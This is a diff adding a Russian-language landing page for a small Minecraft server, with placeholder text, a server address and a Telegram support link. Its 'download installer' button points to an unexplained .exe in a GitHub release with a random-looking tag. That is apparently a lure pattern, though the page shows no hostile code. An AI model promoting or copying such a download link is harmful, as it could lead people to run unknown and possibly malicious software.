@@ -1,0 +1,162 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Серверок для пацанов</title>
+  <style>
+    * { box-sizing: border-box; scroll-behavior: smooth; }
+
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+      color: white;
+      background: radial-gradient(circle at top, #2b2bff, #090914 55%, #000);
+    }
+
+    header {
+      position: fixed;
+      top: 0;
+      width: 100%;
+      padding: 18px 32px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      background: rgba(0, 0, 0, 0.45);
+      backdrop-filter: blur(12px);
+      z-index: 10;
+    }
+
+    .logo {
+      font-size: 22px;
+      font-weight: 800;
+    }
+
+    nav a {
+      color: white;
+      text-decoration: none;
+      margin-left: 18px;
+      padding: 10px 16px;
+      border-radius: 999px;
+      background: rgba(255, 255, 255, 0.12);
+    }
+
+    nav a:hover {
+      background: #5865f2;
+    }
+
+    section {
+      min-height: 100vh;
+      padding: 120px 24px 60px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      text-align: center;
+    }
+
+    .card {
+      max-width: 760px;
+      padding: 42px;
+      border-radius: 28px;
+      background: rgba(255, 255, 255, 0.11);
+      box-shadow: 0 0 40px rgba(88, 101, 242, 0.35);
+      backdrop-filter: blur(18px);
+    }
+
+    h1, h2 {
+      margin-top: 0;
+      font-size: 44px;
+    }
+
+    p {
+      font-size: 20px;
+      line-height: 1.6;
+    }
+
+    .ip {
+      font-size: 26px;
+      font-weight: 800;
+      background: #111;
+      padding: 16px 22px;
+      border-radius: 16px;
+      display: inline-block;
+      margin: 16px 0;
+      border: 1px solid rgba(255,255,255,0.2);
+    }
+
+    .btn {
+      display: inline-block;
+      margin-top: 18px;
+      padding: 15px 24px;
+      border-radius: 16px;
+      background: #5865f2;
+      color: white;
+      text-decoration: none;
+      font-weight: 800;
+    }
+
+    .btn:hover {
+      transform: scale(1.04);
+      background: #7289ff;
+    }
+
+    @media (max-width: 600px) {
+      header {
+        flex-direction: column;
+        gap: 12px;
+      }
+
+      nav a {
+        margin: 4px;
+        display: inline-block;
+      }
+
+      h1, h2 {
+        font-size: 32px;
+      }
+    }
+  </style>
+</head>
+<body>
+  <header>
+    <div class="logo">Серверок для пацанов</div>
+    <nav>
+      <a href="#about">О нас</a>
+      <a href="#play">Играть</a>
+      <a href="#support">Поддержка</a>
+    </nav>
+  </header>
+
+  <section id="about">
+    <div class="card">
+      <h1>Серверок для пацанов</h1>
+      <p>
+        Блаблабла. Очень красивый текст про лучший ламповый Minecraft-сервер,
+        где можно спокойно играть, строить, выживать и угарать с пацанами.
+      </p>
+    </div>
+  </section>
+
+  <section id="play">
+    <div class="card">
+      <h2>Играть</h2>
+      <p>IP сервера:</p>
+      <div class="ip">Hammam.minerent.io</div>
+      <br />
+      <a class="btn" href="https://github.com/pocoi67okak/installer/releases/download/asdasdwads/pocoi6767.exe">
+        Скачать инсталятор
+      </a>
+    </div>
+  </section>
+
+  <section id="support">
+    <div class="card">
+      <h2>Поддержка</h2>
+      <p>Возник вопрос или проблема?</p>
+      <a class="btn" href="https://t.me/kaLLoware_dev">
+        Написать в чат
+      </a>
+    </div>
+  </section>
+</body>
+</html>
